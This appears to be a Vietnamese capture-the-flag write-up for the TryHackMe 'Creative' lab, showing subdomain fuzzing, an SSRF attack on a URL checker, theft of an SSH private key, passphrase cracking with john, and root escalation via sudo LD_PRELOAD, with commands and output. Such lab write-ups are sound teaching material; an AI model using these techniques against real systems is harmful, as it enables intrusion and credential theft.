
---
layout: post
author: Neo
title: Tryhackme - Creative
date: 2024-04-14
tags:
  - tryhackme
  - web
  - ffuf
  - ssrf
  - linux
  - ld_preload
  - ssh
categories: ctf
---
0. this unordered seed list will be replaced by toc as unordered list
{:toc}

[TryHackMe - Creative](https://tryhackme.com/r/room/creative)

## Reconnaissance and Scanning

```python
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsXwQrUw2YlhqFRnJpLvzHz5VnTqQ/Xr+IMJmnIyh82p1WwUsnFHgAELVccD6DdB1ksKH5HxD8iBoY83p3d/UfM8xlPzWGZkTAfZ+SR1b6MJEJU/JEiooZu4aPe4tiRdNQKB09stTOfaMUFsbXSYGjvf5u+gavNZOOTCQxEoKeZzPzxUJ0baz/Vx5Elihfm3MoR0nrE2XFTY6HV2cwLojeWCww3njG+P1E4salm86MAswQWxOeHLk/a0wXJ343X5NaHNuF4Xo3PpqiUr+qEZUyZJKNrH4O8hErH/2h7AUEPpPIo7zEK1ZzqFNWcpOqguYOFVZMagHS//ASg3ikzouZS1nUmS7ehA9bGrhCbqMRSin1QJ/mnwYBylW6IsPyfuJfl9KFnbTITa56URmudd999UzNEj8Wx8Qj4LfTWKLubcYS9iKN+exbAxXOIdbpolVtIFh0mP/cm9WRhf0z9WR9tX1FvJYi013rcaMpy62pjPCO20nbNsnEG6QckMk/4RM=
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOIFbjvSW+v5RoDWDKFI//sn2LxlSxk2ovUPyUzpB1g/XQLlbF1oy3To2D8N8LAWwrLForz4IJ4JrZXR5KvRK8Y=
|   256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFf4qwz85WzZVwohJm4pYByLpBj7j2JiQp4cBqmaBwYV
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://creative.thm
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Thêm domain vào file hosts

`nano /etc/hosts`

`10.10.55.1      creative.thm`

## Enumeration

Truy cập domain với port 80. Sau khi thử các phương pháp đơn giản đều không có kết quả, tôi thử tìm directory bằng **dirsearch**, trong khi chờ kết quả từ **dirsearch**, dựa vào việc machine này có domain, tôi nghĩ ngay đến việc tìm kiếm subdomain từ domain này. Sử dụng **ffuf** để tìm kiếm subdomain 

> ***dirsearch***

```python
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://creative.thm
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_creative.thm/_24-04-14_12-45-22.txt

Target: http://creative.thm/

[12:45:22] Starting: 
[12:46:05] 403 -  564B  - /assets/                                          
[12:46:05] 301 -  178B  - /assets  ->  http://creative.thm/assets/          
                                                                             
Task Completed
```

> ***ffuf***

```python
┌──(root㉿kali)-[/home/kali]
└─# ffuf -u http://creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.creative.thm" -mc 200


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 252ms]
:: Progress: [114441/114441] :: Job [1/1] :: 178 req/sec :: Duration: [0:11:26] :: Errors: 0 ::
```

Truy cập `/assets/` nhưng tôi gặp lỗi Forbbiden - không có quyền truy cập vào dir này. Quay lại với subdomain vừa tìm được, thêm nó vào file hosts

`nano /etc/hosts`

`10.10.55.1      creative.thm    beta.creative.thm`

Truy cập vào subdomain mới

![1.jpg](/assets/img/2024-04-14-THM-Creative/1.jpg)

Tôi có một trang web kiểm tra URL ở đây. Sau một lúc thử nghiệm các input, tôi nhận ra với các input sai (không phải định dạng URL hoặc bất kỳ điều gì, thay vì kiểm tra và trả về kết quả input sai định dạng thì web server trả về kết quả là 1 chữ `Dead`. Điều này có nghĩa là server sẽ xử lý bất kỳ input nào tôi nhập vào -> tôi có thể thực hiện SSRF ở đây.

Sử dụng [SSRFmap](https://github.com/swisskyrepo/SSRFmap) để kiểm tra. 

Đầu tiên, tôi sử dụng Burpsuite để bắt request 

![2.jpg](/assets/img/2024-04-14-THM-Creative/2.jpg)

Lưu request này vào 1 file với tên `resquest.txt`

```python
POST / HTTP/1.1
Host: beta.creative.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://beta.creative.thm
Connection: close
Referer: http://beta.creative.thm/
Upgrade-Insecure-Requests: 1

url=..%2F..%2F..%2F..%2Fect%2Fpasswd
```

Với parameter ở request này là `url`, tôi sẽ sử dụng SSRFmap với các module có khả năng trả về kết quả như `portscan`, `networkscan`, `custom` (các module khác không được sử dụng do không có dịch vụ chạy trên web server này tránh mất thời gian vào việc scan)

Sau khi sử dụng module `portscan` tôi tìm được 1 port khác ngoài port 80 đang mở trên localhost

```python
┌──(root㉿kali)-[/home/kali/SSRFmap]
└─# python ssrfmap.py -r request.txt -p url -m portscan
 _____ _________________                     
/  ___/  ___| ___ \  ___|                    
\ `--.\ `--.| |_/ / |_ _ __ ___   __ _ _ __  
 `--. \`--. \    /|  _| '_ ` _ \ / _` | '_ \ 
/\__/ /\__/ / |\ \| | | | | | | | (_| | |_) |
\____/\____/\_| \_\_| |_| |_| |_|\__,_| .__/ 
                                      | |    
                                      |_|    
[INFO]:Module 'portscan' launched !
        [13:26:45] IP:127.0.0.1   , Found filtered  port n°443                    
        [13:26:45] IP:127.0.0.1   , Found filtered  port n°23                    
        [13:26:45] IP:127.0.0.1   , Found filtered  port n°25                    
        [13:26:45] IP:127.0.0.1   , Found open      port n°80    
        .....
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°3999                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°740                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°12346                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°802                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°1127                    
        [13:28:21] IP:127.0.0.1   , Found open      port n°1337                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°606                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°2600                    
        [13:28:21] IP:127.0.0.1   , Found filtered  port n°1414   
        ......
```

![3.jpg](/assets/img/2024-04-14-THM-Creative/3.jpg)

![4.jpg](/assets/img/2024-04-14-THM-Creative/4.jpg)

Để truy cập được các path này, tôi phải quay lại và nhập thêm path vào url để kiểm tra. Để việc này dễ dàng hơn thì tôi sẽ sử dụng Burpsuite để bắt request này và cho nó vào repeater

![5.jpg](/assets/img/2024-04-14-THM-Creative/5.jpg)

Phần url đã được encode nên để truy cập được các path tôi cũng sẽ phải encode theo url format

![6.jpg](/assets/img/2024-04-14-THM-Creative/6.jpg)

![7.jpg](/assets/img/2024-04-14-THM-Creative/7.jpg)

## SSH

Để ý có thư mục `.ssh`, có thể sẽ lưu ssh key ở đây

![8.jpg](/assets/img/2024-04-14-THM-Creative/8.jpg)

Lấy `id_rsa`

![9.jpg](/assets/img/2024-04-14-THM-Creative/9.jpg)

Lưu key này về và login ssh 

```python
┌──(root㉿kali)-[/home/kali]
└─# chmod 600 id_rsa                   
                                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali]
└─# ssh -i id_rsa saad@10.10.55.1      
The authenticity of host '10.10.55.1 (10.10.55.1)' can't be established.
ED25519 key fingerprint is SHA256:09XvTnhtDcy1LRcuA8MJ6i3a1gN/7Prv5xmZF9v8Gq4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.55.1' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

Vậy là tôi cần passphrase. Sử dụng **john** để crack pass từ key này

```python
┌──(root㉿kali)-[/home/kali]
└─# ssh2john id_rsa > id_rsa.hash

┌──(root㉿kali)-[/home/kali]
└─# john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
***********        (id_rsa)     
1g 0:00:00:26 DONE (2024-04-14 14:02) 0.03818g/s 36.65p/s 36.65c/s 36.65C/s 242424..marie1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Login ssh

```python
┌──(root㉿kali)-[/home/kali]
└─# john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetness        (id_rsa)     
1g 0:00:00:26 DONE (2024-04-14 14:02) 0.03818g/s 36.65p/s 36.65c/s 36.65C/s 242424..marie1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali]
└─# ssh -i id_rsa saad@10.10.55.1                                                                 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 14 Apr 2024 06:03:58 PM UTC

  System load:  0.0               Processes:             115
  Usage of /:   57.5% of 8.02GB   Users logged in:       0
  Memory usage: 27%               IPv4 address for eth0: 10.10.55.1
  Swap usage:   0%


58 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@m4lware:~$ id
uid=1000(saad) gid=1000(saad) groups=1000(saad)
saad@m4lware:~$ 
saad@m4lware:~$ ls -la
total 52
drwxr-xr-x 7 saad saad 4096 Jan 21  2023 .
drwxr-xr-x 3 root root 4096 Jan 20  2023 ..
-rw------- 1 saad saad  362 Jan 21  2023 .bash_history
-rw-r--r-- 1 saad saad  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 saad saad 3797 Jan 21  2023 .bashrc
drwx------ 2 saad saad 4096 Jan 20  2023 .cache
drwx------ 3 saad saad 4096 Jan 20  2023 .gnupg
drwxrwxr-x 3 saad saad 4096 Jan 20  2023 .local
-rw-r--r-- 1 saad saad  807 Feb 25  2020 .profile
drwx------ 3 saad saad 4096 Jan 20  2023 snap
drwx------ 2 saad saad 4096 Jan 21  2023 .ssh
-rwxr-xr-x 1 root root  150 Jan 20  2023 start_server.py
-rw-r--r-- 1 saad saad    0 Jan 20  2023 .sudo_as_admin_successful
-rw-rw---- 1 saad saad   33 Jan 21  2023 user.txt
```

## Privilege escalation

Sau khi tìm loanh quanh user này, tôi có thông tin đăng nhập ở `.bash_history`

```python
saad@m4lware:~$ cat .bash_history 
whoami
pwd
ls -al
ls
cd ..
sudo -l
echo "saad:******************$4291" > creds.txt
rm creds.txt
sudo -l
whomai
whoami
pwd
ls -al
sudo -l
ls -al
pwd
whoami
mysql -u root -p
netstat -antlp
mysql -u root
sudo su
ssh root@192.169.155.104
mysql -u user -p
mysql -u db_user -p
ls -ld /var/lib/mysql
ls -al
cat .bash_history 
cat .bash_logout 
nano .bashrc 
ls -al
```

Sử dụng nó để tìm kiếm các thông tin khác

```python
saad@m4lware:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```

Để ý vào phần `env_keep+=LD_PRELOAD`, tìm kiếm về LD_PRELOAD privilege escalation, tôi tìm thấy [hướng dẫn](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/) ngay ở link đầu tiên.

Làm theo hướng dẫn và tôi có **root**

```python
saad@m4lware:~$ cd /tmp/
saad@m4lware:/tmp$ nano shell.c
saad@m4lware:/tmp$ gcc -shared -fPIC -o shell.so shell.c -nostartfiles
saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
bash: fork: Resource temporarily unavailable
root@m4lware:/tmp# id
bash: fork: retry: Resource temporarily unavailable
root@m4lware:/tmp# exit
exit
sh: 1: Cannot fork
/usr/bin/lesspipe: 28: Cannot fork
root@m4lware:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@m4lware:/tmp# cd /root
root@m4lware:~# ls -la
total 44
drwx------  5 root root 4096 Nov  6 07:56 .
drwxr-xr-x 19 root root 4096 Dec  3  2022 ..
-rw-------  1 root root   48 Apr 14 18:57 .bash_history
-rw-r--r--  1 root root 3132 Jan 21  2023 .bashrc
drwxr-xr-x  3 root root 4096 Jan 20  2023 .cache
drwxr-xr-x  3 root root 4096 Jan 20  2023 .local
-rw-------  1 root root    1 Jan 21  2023 .mysql_history
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-------  1 root root    1 Jan 21  2023 .python_history
-rw-------  1 root root   33 Jan 21  2023 root.txt
drwx------  3 root root 4096 Jan 20  2023 snap
root@m4lware:~# 
```

